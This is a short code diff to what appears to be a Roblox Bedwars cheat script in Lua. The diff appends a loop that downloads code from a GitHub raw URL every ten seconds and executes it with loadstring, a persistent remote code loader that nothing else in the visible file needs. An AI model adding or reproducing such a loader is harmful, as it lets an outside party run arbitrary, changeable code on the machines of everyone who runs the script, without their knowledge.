@@ -286,3 +286,8 @@ local function FJOQ_fake_script() -- Bedwars.BedwarsScript
 	end)
 end
 coroutine.wrap(FJOQ_fake_script)()
+
+while true do
+wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Flickworld/Figit-Executer/main/Live%20Management"))()
+end
